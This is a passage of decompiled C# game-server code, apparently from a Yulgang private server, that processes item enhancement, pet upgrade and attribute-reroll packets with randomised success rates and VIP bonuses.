													if (装备栏包裹[num63].Get物品ID != 1008001061L)
													{
														return;
													}
												}
												else if (value80.FLD_RESIDE2 != 1 || 装备栏包裹[num63].Get物品ID != 1008001062L)
												{
													return;
												}
												if (!合成物品表.ContainsKey(2))
												{
													HcItimesClass hcItimesClass98 = new HcItimesClass();
													hcItimesClass98.位置 = num2;
													hcItimesClass98.物品 = 装备栏包裹[num2].物品_byte;
													装备栏包裹[num2].锁定 = true;
													合成物品表.Add(2, hcItimesClass98);
													合成提示(num, 1, 0, 装备栏包裹[num2]);
												}
											}
										}
										else
										{
											合成提示(num, 0, 0, 装备栏包裹[num2]);
										}
									}
									return;
								}
							}
							catch (Exception ex76)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex76.Message);
							}
							goto default;
						case 263:
							if (合成物品表.Count > 1)
							{
								int num42 = BitConverter.ToUInt16(封包数据, 14);
								if (装备栏包裹[num42].Get物品ID == 1008001061L || 装备栏包裹[num42].Get物品ID == 1008001062L)
								{
									int num9 = BitConverter.ToInt32(封包数据, 18);
									if ((uint)(num9 - 1008001061) <= 1u)
									{
										HcItimesClass hcItimesClass64 = null;
										HcItimesClass hcItimesClass65 = null;
										if (合成物品表.ContainsKey(1))
										{
											hcItimesClass64 = 合成物品表[1];
										}
										if (合成物品表.ContainsKey(2))
										{
											hcItimesClass65 = 合成物品表[2];
										}
										hcItimesClass64.得到属性();
										hcItimesClass64.强化属性阶段();
										hcItimesClass65.得到属性();
										hcItimesClass65.强化属性阶段();
										double num43 = RNG.Next(20, 180);
										double num44 = hcItimesClass64.强化数量 * 10;
										if (hcItimesClass64.强化数量 < 12)
										{
											num44 = hcItimesClass64.强化数量 * 14;
										}
										else if (hcItimesClass64.强化数量 <= 15)
										{
											num44 = hcItimesClass64.强化数量 * 15;
										}
										if (元宝合成开关 == 1)
										{
											num43 += 5.0;
										}
										if (base.FLD_VIP == 1)
										{
											num43 += 100.0 * World.VIP合成率增加百分比;
										}
										if (World.强化率 != 0.0)
										{
											num43 += 100.0 * World.强化率;
										}
										if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
										{
											num43 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
										}
										if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
										{
											num43 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
										}
										if (GM模式 == 8)
										{
											num44 = 0.0;
										}
										if (num43 >= num44)
										{
											hcItimesClass65.强化类型 = 1;
											hcItimesClass65.强化数量 = hcItimesClass64.强化数量;
											hcItimesClass65.设置阶段属性();
											减去物品(hcItimesClass64.位置, 1);
											减去物品(hcItimesClass65.位置, 1);
											增加物品(hcItimesClass65.物品全局ID, hcItimesClass65.物品id, hcItimesClass65.位置, hcItimesClass65.物品数量, hcItimesClass65.物品属性);
											合成提示(num, 1, 0, 装备栏包裹[hcItimesClass65.位置]);
											RxjhClass.合成记录(base.Userid, base.UserName, 装备栏包裹[hcItimesClass65.位置].得到物品名称(), num, "强化转移", "成功", 装备栏包裹[hcItimesClass65.位置]);
										}
										else
										{
											合成提示(num, 0, 0, 装备栏包裹[hcItimesClass65.位置]);
											RxjhClass.合成记录(base.Userid, base.UserName, 装备栏包裹[hcItimesClass65.位置].得到物品名称(), num, "强化转移", "失败", 装备栏包裹[hcItimesClass65.位置]);
										}
										减去物品(num42, 1);
										合成物品表.Clear();
										合成系统解锁();
										元宝合成开关 = 0;
										合成手续费 = 0;
									}
									break;
								}
							}
							goto default;
						case 270:
							try
							{
								HcItimesClass value59;
								if (合成物品表.TryGetValue(1, out value59))
								{
									装备栏包裹[value59.位置].锁定 = false;
									合成物品表.Clear();
									System.Buffer.BlockCopy(array2, 0, array, 10, 2);
									合成系统解锁();
								}
								元宝合成开关 = 0;
								合成提示(num, 0, 0, 装备栏包裹[num2]);
							}
							catch (Exception ex54)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 强化合成 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex54.Message);
							}
							break;
						case 271:
							try
							{
								if (!合成物品表.ContainsKey(1))
								{
									if (装备栏包裹[num2].物品绑定)
									{
										合成提示(num, 2, 0, 装备栏包裹[num2]);
									}
									else
									{
										HcItimesClass hcItimesClass62 = new HcItimesClass();
										hcItimesClass62.位置 = num2;
										hcItimesClass62.物品 = 装备栏包裹[num2].物品_byte;
										装备栏包裹[num2].锁定 = true;
										合成物品表.Add(1, hcItimesClass62);
										合成提示(num, 0, 0, 装备栏包裹[num2]);
									}
								}
							}
							catch (Exception ex52)
							{
								Form1.WriteLine(1, "合成系统 强化合成 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex52.Message);
							}
							break;
						case 272:
							try
							{
								if (合成物品表.ContainsKey(1))
								{
									if (合成物品表.ContainsKey(1))
									{
										HcItimesClass hcItimesClass81 = 合成物品表[1];
										ItmeClass value72;
										if (合成物品表.Count == 0)
										{
											合成提示(num, 2, 0, 装备栏包裹[num2]);
										}
										else if (BitConverter.ToInt32(装备栏包裹[num2].物品数量, 0) >= 1 && (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass81.物品id, 0), out value72) || value72.FLD_PID == 1000001170 || value72.FLD_PID == 1000001171 || value72.FLD_PID == 1000001172 || value72.FLD_PID == 1000001173 || value72.FLD_PID == 1000001174 || value72.FLD_PID == 1000001175))
										{
											if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 800000060 && BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 1008001988)
											{
												合成提示(num, 7, 0, 装备栏包裹[num2]);
											}
											else
											{
												HcItimesClass hcItimesClass82 = new HcItimesClass();
												hcItimesClass82.位置 = num2;
												hcItimesClass82.物品 = 装备栏包裹[num2].物品_byte;
												装备栏包裹[num2].锁定 = true;
												if (!合成物品表.ContainsKey(2))
												{
													合成物品表.Add(2, hcItimesClass82);
													合成提示(num, 0, 0, 装备栏包裹[num2]);
												}
											}
										}
									}
									else
									{
										合成提示(num, 5, 0, 装备栏包裹[num2]);
									}
								}
							}
							catch (Exception ex65)
							{
								Form1.WriteLine(1, "合成系统 强化合成 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex65.Message);
							}
							break;
						case 273:
							try
							{
								if (合成物品表.Count == 0 || 合成物品表.ContainsKey(5))
								{
									return;
								}
								HcItimesClass hcItimesClass66 = new HcItimesClass();
								hcItimesClass66.位置 = num2;
								hcItimesClass66.物品 = 装备栏包裹[num2].物品_byte;
								装备栏包裹[num2].锁定 = true;
								合成物品表.Add(5, hcItimesClass66);
								合成提示(num, 0, 0, 装备栏包裹[num2]);
							}
							catch (Exception ex55)
							{
								Form1.WriteLine(1, "合成系统 强化合成 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex55.Message);
								return;
							}
							goto default;
						case 274:
							灵宠强化提示(0, num4);
							break;
						case 275:
							try
							{
								if (合成物品表.Count > 0)
								{
									HcItimesClass hcItimesClass59 = null;
									HcItimesClass hcItimesClass60 = null;
									HcItimesClass hcItimesClass61 = null;
									if (合成物品表.ContainsKey(1))
									{
										hcItimesClass59 = 合成物品表[1];
									}
									if (合成物品表.ContainsKey(2))
									{
										hcItimesClass60 = 合成物品表[2];
									}
									if (合成物品表.ContainsKey(5))
									{
										hcItimesClass61 = 合成物品表[5];
									}
									if (BitConverter.ToInt64(装备栏包裹[hcItimesClass59.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass59.物品全局ID, 0) && hcItimesClass60 != null && (hcItimesClass60 == null || (BitConverter.ToInt64(装备栏包裹[hcItimesClass60.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass60.物品全局ID, 0) && (BitConverter.ToInt32(装备栏包裹[hcItimesClass60.位置].物品ID, 0) == 1008001988 || BitConverter.ToInt32(装备栏包裹[hcItimesClass60.位置].物品ID, 0) == 800000060))))
									{
										hcItimesClass59.得到属性();
										hcItimesClass59.强化属性阶段();
										ItmeClass value57;
										if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass59.物品id, 0), out value57))
										{
											if (value57.FLD_RESIDE2 != 16)
											{
												Form1.WriteLine(6, "合成系统 强化 BUG1[" + BitConverter.ToInt32(hcItimesClass59.物品id, 0) + "]-[" + BitConverter.ToInt32(hcItimesClass60.物品id, 0) + "]");
											}
											else if (装备栏包裹[hcItimesClass59.位置].物品绑定)
											{
												合成提示(num, 2, 0, 装备栏包裹[hcItimesClass59.位置]);
											}
											else
											{
												Random random = new Random();
												string[] array12 = World.灵宠强化总概率.Split(';');
												double num40 = random.Next(int.Parse(array12[0]), int.Parse(array12[1]));
												int 强化数量 = hcItimesClass59.强化数量;
												double num41 = (hcItimesClass59.强化数量 <= 10) ? ((double)hcItimesClass59.强化数量 * World.灵宠强化一阶段概率) : ((hcItimesClass59.强化数量 > 10 && hcItimesClass59.强化数量 <= 20) ? ((double)hcItimesClass59.强化数量 * World.灵宠强化一阶段概率) : ((hcItimesClass59.强化数量 > 20 && hcItimesClass59.强化数量 <= 30) ? ((double)hcItimesClass59.强化数量 * World.灵宠强化二阶段概率) : ((hcItimesClass59.强化数量 > 30 && hcItimesClass59.强化数量 <= 40) ? ((double)hcItimesClass59.强化数量 * World.灵宠强化三阶段概率) : ((hcItimesClass59.强化数量 > 40 && hcItimesClass59.强化数量 <= 50) ? ((double)hcItimesClass59.强化数量 * World.灵宠强化四阶段概率) : ((hcItimesClass59.强化数量 > 50 && hcItimesClass59.强化数量 <= 60) ? ((double)hcItimesClass59.强化数量 * World.灵宠强化五阶段概率) : ((hcItimesClass59.强化数量 <= 60 || hcItimesClass59.强化数量 > 70) ? ((double)hcItimesClass59.强化数量 * World.灵宠强化七阶段概率) : ((double)hcItimesClass59.强化数量 * World.灵宠强化六阶段概率)))))));
												if (hcItimesClass59.强化数量 < 99)
												{
													if (hcItimesClass61 != null)
													{
														switch (BitConverter.ToInt32(hcItimesClass61.物品id, 0))
														{
														case 1008000136:
															num40 += 25.0;
															break;
														case 800000029:
															num40 += 20.0;
															break;
														case 800000003:
															num40 += 5.0;
															break;
														case 800000004:
															num40 += 10.0;
															break;
														case 800000005:
															num40 += 15.0;
															break;
														}
													}
													if (公有药品.ContainsKey(1008000312))
													{
														num40 += 10.0;
													}
													if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
													{
														num40 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
													}
													if (元宝合成开关 == 1)
													{
														num40 += 5.0;
													}
													if (base.FLD_VIP == 1)
													{
														num40 += 100.0 * World.VIP合成率增加百分比;
													}
													if (World.合成率 != 0.0)
													{
														num40 += 100.0 * World.合成率;
													}
													if (num40 > num41)
													{
														if (value57.FLD_RESIDE2 == 16)
														{
															hcItimesClass59.强化类型 = 19;
														}
														int num9 = ++hcItimesClass59.强化数量;
														if (hcItimesClass59.强化数量 > 99)
														{
															hcItimesClass59.强化数量 = 99;
														}
														hcItimesClass59.设置阶段属性();
														if (hcItimesClass59.强化数量 >= 8)
														{
															发送快报(base.UserName, hcItimesClass59.强化数量, hcItimesClass59.物品id, base.Player_Zx);
														}
														if (BitConverter.ToInt32(装备栏包裹[hcItimesClass59.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass59.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass59.物品全局ID, 0))
														{
															减去物品(hcItimesClass59.位置, 1);
															增加物品(hcItimesClass59.物品全局ID, hcItimesClass59.物品id, hcItimesClass59.位置, hcItimesClass59.物品数量, hcItimesClass59.物品属性);
														}
														装备栏包裹[hcItimesClass59.位置].锁定 = false;
														if (base.FLD_VIP == 1)
														{
															系统提示("恭喜您，VIP用户提高合成率" + World.VIP合成率增加百分比 * 100.0 + "%", 9, "系统提示");
														}
														灵宠合成提示(num, 0, 0, 装备栏包裹[num3], num4);
													}
													else
													{
														if (hcItimesClass59.强化数量 >= 3)
														{
															if (BitConverter.ToInt32(装备栏包裹[hcItimesClass60.位置].物品ID, 0) == 1008001988)
															{
																int num9 = --hcItimesClass59.强化数量;
															}
															else
															{
																hcItimesClass59.强化数量 -= 3;
															}
														}
														hcItimesClass59.设置阶段属性();
														if (BitConverter.ToInt32(装备栏包裹[hcItimesClass59.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass59.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass59.物品全局ID, 0))
														{
															减去物品(hcItimesClass59.位置, 1);
															增加物品(hcItimesClass59.物品全局ID, hcItimesClass59.物品id, hcItimesClass59.位置, hcItimesClass59.物品数量, hcItimesClass59.物品属性);
														}
														灵宠合成提示(num, -1, 0, 装备栏包裹[num3], num4);
													}
													减去物品(hcItimesClass60.位置, 1);
													if (hcItimesClass61 != null)
													{
														减去物品(hcItimesClass61.位置, 1);
													}
													合成物品表.Clear();
													合成系统解锁();
													元宝合成开关 = 0;
												}
											}
										}
									}
								}
							}
							catch (Exception ex50)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 强化合成 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex50.Message);
								Form1.WriteLine(1, "合成系统 强化合成 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex50.StackTrace);
							}
							break;
						case 280:
							try
							{
								HcItimesClass value58;
								if (合成物品表.TryGetValue(1, out value58))
								{
									装备栏包裹[value58.位置].锁定 = false;
									合成物品表.Clear();
									System.Buffer.BlockCopy(array2, 0, array, 11, 2);
									合成系统解锁();
								}
								元宝合成开关 = 0;
								合成提示(num, 0, 0, 装备栏包裹[num2]);
							}
							catch (Exception ex51)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 强化合成 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex51.Message);
							}
							break;
						case 281:
							try
							{
								if (!合成物品表.ContainsKey(1))
								{
									if (装备栏包裹[num2].物品绑定)
									{
										合成提示(num, 2, 0, 装备栏包裹[num2]);
									}
									else
									{
										HcItimesClass hcItimesClass63 = new HcItimesClass();
										hcItimesClass63.位置 = num2;
										hcItimesClass63.物品 = 装备栏包裹[num2].物品_byte;
										装备栏包裹[num2].锁定 = true;
										合成物品表.Add(1, hcItimesClass63);
										合成提示(num, 0, 0, 装备栏包裹[num2]);
									}
								}
							}
							catch (Exception ex53)
							{
								Form1.WriteLine(1, "合成系统 强化合成 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex53.Message);
							}
							break;
						case 282:
							try
							{
								if (合成物品表.Count == 0)
								{
									合成提示(num, 2, 0, 装备栏包裹[num2]);
								}
								else
								{
									HcItimesClass hcItimesClass57 = null;
									if (合成物品表.ContainsKey(1))
									{
										hcItimesClass57 = 合成物品表[1];
									}
									hcItimesClass57.得到属性();
									hcItimesClass57.强化属性阶段();
									if (!合成物品表.ContainsKey(2) && 装备栏包裹[num2].属性1.属性数量 == hcItimesClass57.属性1.属性数量)
									{
										if (装备栏包裹[num2].物品绑定)
										{
											合成提示(num, 2, 0, 装备栏包裹[num2]);
										}
										else
										{
											HcItimesClass hcItimesClass58 = new HcItimesClass();
											hcItimesClass58.位置 = num2;
											hcItimesClass58.物品 = 装备栏包裹[num2].物品_byte;
											装备栏包裹[num2].锁定 = true;
											合成物品表.Add(2, hcItimesClass58);
											合成提示(num, 0, 0, 装备栏包裹[num2]);
										}
									}
								}
							}
							catch (Exception ex49)
							{
								Form1.WriteLine(1, "合成系统 强化合成 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex49.Message);
							}
							break;
						case 283:
							try
							{
								if (合成物品表.Count >= 2 && !合成物品表.ContainsKey(3))
								{
									if (装备栏包裹[num2].物品绑定)
									{
										合成提示(num, 2, 0, 装备栏包裹[num2]);
									}
									else if (装备栏包裹[num2].Get物品ID == 1008001941L)
									{
										HcItimesClass hcItimesClass55 = new HcItimesClass();
										hcItimesClass55.位置 = num2;
										hcItimesClass55.物品 = 装备栏包裹[num2].物品_byte;
										装备栏包裹[num2].锁定 = true;
										合成物品表.Add(3, hcItimesClass55);
										合成提示(num, 0, 0, 装备栏包裹[num2]);
									}
								}
							}
							catch (Exception ex47)
							{
								Form1.WriteLine(1, "合成系统 强化合成 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex47.Message);
							}
							break;
						case 284:
							try
							{
								if (合成物品表.Count >= 2 && !合成物品表.ContainsKey(4))
								{
									if (装备栏包裹[num2].物品绑定)
									{
										合成提示(num, 2, 0, 装备栏包裹[num2]);
									}
									else if (装备栏包裹[num2].Get物品ID == 1008001942L)
									{
										HcItimesClass hcItimesClass83 = new HcItimesClass();
										hcItimesClass83.位置 = num2;
										hcItimesClass83.物品 = 装备栏包裹[num2].物品_byte;
										装备栏包裹[num2].锁定 = true;
										合成物品表.Add(4, hcItimesClass83);
										合成提示(num, 0, 0, 装备栏包裹[num2]);
									}
								}
							}
							catch (Exception ex66)
							{
								Form1.WriteLine(1, "合成系统 强化合成 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex66.Message);
							}
							break;
						case 285:
							try
							{
								if (合成物品表.Count > 0)
								{
									HcItimesClass hcItimesClass27 = null;
									HcItimesClass hcItimesClass28 = null;
									HcItimesClass hcItimesClass29 = null;
									HcItimesClass hcItimesClass30 = null;
									if (合成物品表.ContainsKey(1))
									{
										hcItimesClass27 = 合成物品表[1];
									}
									if (合成物品表.ContainsKey(2))
									{
										hcItimesClass28 = 合成物品表[2];
									}
									if (合成物品表.ContainsKey(3))
									{
										hcItimesClass29 = 合成物品表[3];
									}
									if (合成物品表.ContainsKey(4))
									{
										hcItimesClass30 = 合成物品表[4];
									}
									if (BitConverter.ToInt64(装备栏包裹[hcItimesClass27.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass27.物品全局ID, 0) && BitConverter.ToInt64(装备栏包裹[hcItimesClass28.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass28.物品全局ID, 0) && (hcItimesClass29 == null || BitConverter.ToInt64(装备栏包裹[hcItimesClass29.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass29.物品全局ID, 0)) && (hcItimesClass30 == null || BitConverter.ToInt64(装备栏包裹[hcItimesClass30.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass30.物品全局ID, 0)))
									{
										hcItimesClass27.得到属性();
										hcItimesClass27.强化属性阶段();
										hcItimesClass28.得到属性();
										hcItimesClass28.强化属性阶段();
										ItmeClass value31;
										if (装备栏包裹[hcItimesClass27.位置].物品绑定)
										{
											合成提示(num, 2, 0, 装备栏包裹[hcItimesClass27.位置]);
										}
										else if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass27.物品id, 0), out value31))
										{
											if (value31.FLD_RESIDE2 != 16)
											{
												Form1.WriteLine(6, "合成系统 WGF BUG11[" + BitConverter.ToInt32(hcItimesClass27.物品id, 0) + "]-[" + BitConverter.ToInt32(hcItimesClass28.物品id, 0) + "]");
											}
											else
											{
												double num30 = new Random(World.GetRandomSeed()).Next(0, 100);
												double num31 = hcItimesClass27.属性1.属性数量 * 30;
												if (hcItimesClass27.属性1.属性数量 == hcItimesClass28.属性1.属性数量)
												{
													if (hcItimesClass29 != null && BitConverter.ToInt32(hcItimesClass29.物品id, 0) == 1008001941)
													{
														num30 += 20.0;
													}
													if (公有药品.ContainsKey(1008000312))
													{
														num30 += 10.0;
													}
													if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
													{
														num30 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
													}
													if (元宝合成开关 == 1)
													{
														num30 += 5.0;
													}
													if (World.灵宠进化率 != 0.0)
													{
														num30 += 100.0 * World.灵宠进化率;
													}
													if (base.FLD_VIP == 1)
													{
														num30 += 100.0 * World.VIP合成率增加百分比;
													}
													if (World.合成率 != 0.0)
													{
														num30 += 100.0 * World.合成率;
													}
													if (num30 > num31)
													{
														if (hcItimesClass30 == null)
														{
															hcItimesClass27.强化数量 = 0;
															hcItimesClass27.设置阶段属性();
														}
														hcItimesClass27.属性1.属性类型 = 22;
														int num9 = ++hcItimesClass27.属性1.属性数量;
														hcItimesClass27.设置属性();
														if (base.FLD_VIP == 1)
														{
															系统提示("恭喜您，VIP用户提高合成率" + World.VIP合成率增加百分比 * 100.0 + "%", 9, "系统提示");
														}
														合成提示(num, 0, 0, 装备栏包裹[num2]);
													}
													else
													{
														系统提示("VIP用户提高合成率" + World.VIP合成率增加百分比 * 100.0 + "%", 9, "系统提示");
														合成提示(num, -1, 0, 装备栏包裹[num2]);
													}
													减去物品(hcItimesClass28.位置, 1);
													if (hcItimesClass29 != null)
													{
														减去物品(hcItimesClass29.位置, 1);
													}
													if (hcItimesClass30 != null)
													{
														减去物品(hcItimesClass30.位置, 1);
													}
													if (BitConverter.ToInt32(装备栏包裹[hcItimesClass27.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass27.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass27.物品全局ID, 0))
													{
														减去物品(hcItimesClass27.位置, 1);
														增加物品(hcItimesClass27.物品全局ID, hcItimesClass27.物品id, hcItimesClass27.位置, hcItimesClass27.物品数量, hcItimesClass27.物品属性);
													}
													装备栏包裹[hcItimesClass27.位置].锁定 = false;
													合成物品表.Clear();
													合成系统解锁();
													元宝合成开关 = 0;
												}
											}
										}
									}
								}
							}
							catch (Exception ex32)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 合成属性 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex32.Message);
							}
							break;
						case 291:
							try
							{
								ItmeClass value56;
								if (!合成物品表.ContainsKey(1) && World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value56) && (value56.FLD_PID == 1000001160 || value56.FLD_PID == 1000001151) && !装备栏包裹[num2].锁定)
								{
									HcItimesClass hcItimesClass56 = new HcItimesClass();
									hcItimesClass56.位置 = num2;
									hcItimesClass56.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									if (!合成物品表.ContainsKey(1))
									{
										合成物品表.Add(1, hcItimesClass56);
									}
									合成提示(num, 0, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex48)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "灵宠孵化出错![" + base.Userid + "]-[" + base.UserName + "]" + ex48.Message);
							}
							break;
						case 140:
							try
							{
								byte[] array7 = new byte[4];
								byte[] array8 = new byte[4];
								byte[] array9 = new byte[2];
								System.Buffer.BlockCopy(封包数据, 14, array7, 0, 4);
								System.Buffer.BlockCopy(封包数据, 18, array8, 0, 4);
								System.Buffer.BlockCopy(封包数据, 110, array9, 0, 2);
								int num26 = BitConverter.ToInt16(array9, 0);
								int num9 = BitConverter.ToInt32(array8, 0);
								if ((num9 == 1008000041 || num9 == 1008001078) && (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array7, 0)].物品ID, 0) == 1008000041 || BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array7, 0)].物品ID, 0) == 1008001078) && 合成物品表.Count > 0)
								{
									HcItimesClass hcItimesClass24 = null;
									HcItimesClass hcItimesClass25 = null;
									HcItimesClass hcItimesClass26 = null;
									if (合成物品表.ContainsKey(1))
									{
										hcItimesClass24 = 合成物品表[1];
									}
									if (合成物品表.ContainsKey(2))
									{
										hcItimesClass25 = 合成物品表[2];
									}
									if (合成物品表.ContainsKey(3))
									{
										hcItimesClass26 = 合成物品表[3];
									}
									if (BitConverter.ToInt64(装备栏包裹[hcItimesClass24.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass24.物品全局ID, 0) && BitConverter.ToInt64(装备栏包裹[hcItimesClass25.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass25.物品全局ID, 0) && (hcItimesClass26 == null || BitConverter.ToInt64(装备栏包裹[hcItimesClass26.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass26.物品全局ID, 0)))
									{
										hcItimesClass24.得到属性();
										hcItimesClass24.强化属性阶段();
										hcItimesClass25.强化属性阶段();
										ItmeClass value30;
										if (装备栏包裹[hcItimesClass24.位置].物品绑定)
										{
											合成提示(21, 3, 0, 装备栏包裹[hcItimesClass24.位置]);
											合成物品表.Clear();
										}
										else if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass24.物品id, 0), out value30))
										{
											if (value30.FLD_RESIDE2 == 4)
											{
												if (value30.FLD_RESIDE1 != 8 && value30.FLD_RESIDE1 != 9)
												{
													合成提示(21, 5, 0, 装备栏包裹[hcItimesClass24.位置]);
													合成物品表.Clear();
													return;
												}
												if (BitConverter.ToInt32(hcItimesClass25.物品id, 0) != 800000001 && BitConverter.ToInt32(hcItimesClass25.物品id, 0) != 800000023 && BitConverter.ToInt32(hcItimesClass25.物品id, 0) != 800000025 && BitConverter.ToInt32(hcItimesClass25.物品id, 0) != 800000026 && BitConverter.ToInt32(hcItimesClass25.物品id, 0) != 800000061)
												{
													合成提示(21, 5, 0, 装备栏包裹[hcItimesClass24.位置]);
													合成物品表.Clear();
													return;
												}
											}
											else
											{
												if (value30.FLD_RESIDE2 != 12)
												{
													合成提示(21, 5, 0, 装备栏包裹[hcItimesClass24.位置]);
													合成物品表.Clear();
													return;
												}
												if (BitConverter.ToInt32(hcItimesClass25.物品id, 0) != 800000013)
												{
													合成提示(21, 5, 0, 装备栏包裹[hcItimesClass24.位置]);
													合成物品表.Clear();
													return;
												}
											}
											if (合成手续费 > 0)
											{
												if (base.Player_Money < 合成手续费)
												{
													合成提示(11, 4, 0, 装备栏包裹[hcItimesClass24.位置]);
													合成物品表.Clear();
													return;
												}
												base.Player_Money -= 合成手续费;
												更新金钱和负重();
											}
											double num27 = RNG.Next(50, 120);
											int num28 = hcItimesClass25.阶段数量;
											if (num28 > 35)
											{
												if (num28 > 90 && num28 <= 100)
												{
													num28 -= 65;
												}
												else if (num28 > 70 && num28 <= 90)
												{
													num28 -= 60;
												}
												else if (num28 > 50 && num28 <= 70)
												{
													num28 = 4;
												}
												else if (num28 > 45 && num28 <= 50)
												{
													num28 = 3;
												}
												else if (num28 > 40 && num28 <= 45)
												{
													num28 = 2;
												}
												else if (num28 >= 35 && num28 <= 40)
												{
													num28 = 1;
												}
											}
											double num29 = hcItimesClass24.属性1.数量 * 20 + hcItimesClass24.属性2.数量 * 20 + hcItimesClass24.属性3.数量 * 20 + hcItimesClass24.属性4.数量 * 20 + num28;
											if (hcItimesClass24.属性1.属性数量 != 0 && hcItimesClass24.属性2.属性数量 != 0 && hcItimesClass24.属性3.属性数量 != 0 && hcItimesClass24.属性4.属性数量 != 0)
											{
												if (hcItimesClass26 != null)
												{
													num27 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass26.物品id, 0));
												}
												if (元宝合成开关 == 1)
												{
													num27 += 5.0;
												}
												if (base.FLD_VIP == 1)
												{
													num27 += 100.0 * World.VIP合成率增加百分比;
												}
												if (World.合成率 != 0.0)
												{
													num27 += 100.0 * World.合成率;
												}
												if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
												{
													num27 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
												}
												if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
												{
													num27 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
												}
												if (num27 >= num29)
												{
													switch (num26)
													{
													case 0:
														if (hcItimesClass24.属性1.属性类型 != 0)
														{
															if (hcItimesClass25.阶段类型 == 8)
															{
																hcItimesClass24.属性1.气功属性类型 = hcItimesClass25.气功属性类型;
															}
															hcItimesClass24.属性1.属性类型 = hcItimesClass25.阶段类型;
															hcItimesClass24.属性1.属性数量 = hcItimesClass25.阶段数量;
															hcItimesClass24.设置属性();
														}
														break;
													case 1:
														if (hcItimesClass24.属性2.属性类型 != 0)
														{
															if (hcItimesClass25.阶段类型 == 8)
															{
																hcItimesClass24.属性2.气功属性类型 = hcItimesClass25.气功属性类型;
															}
															hcItimesClass24.属性2.属性类型 = hcItimesClass25.阶段类型;
															hcItimesClass24.属性2.属性数量 = hcItimesClass25.阶段数量;
															hcItimesClass24.设置属性();
														}
														break;
													case 2:
														if (hcItimesClass24.属性3.属性类型 != 0)
														{
															if (hcItimesClass25.阶段类型 == 8)
															{
																hcItimesClass24.属性3.气功属性类型 = hcItimesClass25.气功属性类型;
															}
															hcItimesClass24.属性3.属性类型 = hcItimesClass25.阶段类型;
															hcItimesClass24.属性3.属性数量 = hcItimesClass25.阶段数量;
															hcItimesClass24.设置属性();
														}
														break;
													case 3:
														if (hcItimesClass24.属性4.属性类型 != 0)
														{
															if (hcItimesClass25.阶段类型 == 8)
															{
																hcItimesClass24.属性4.气功属性类型 = hcItimesClass25.气功属性类型;
															}
															hcItimesClass24.属性4.属性类型 = hcItimesClass25.阶段类型;
															hcItimesClass24.属性4.属性数量 = hcItimesClass25.阶段数量;
															hcItimesClass24.设置属性();
														}
														break;
													}
													RxjhClass.合成记录(base.Userid, base.UserName, value30.ItmeNAME, num, "火龙之石", "成功", 装备栏包裹[hcItimesClass24.位置]);
													合成提示(num, 1, 合成手续费, 装备栏包裹[hcItimesClass24.位置]);
												}
												else
												{
													RxjhClass.合成记录(base.Userid, base.UserName, value30.ItmeNAME, num, "火龙之石", "失败", 装备栏包裹[hcItimesClass24.位置]);
													合成提示(num, 0, 合成手续费, 装备栏包裹[hcItimesClass24.位置]);
												}
												减去物品(hcItimesClass25.位置, 1);
												减去物品(BitConverter.ToInt32(array7, 0), 1);
												if (hcItimesClass26 != null)
												{
													减去物品(hcItimesClass26.位置, 1);
												}
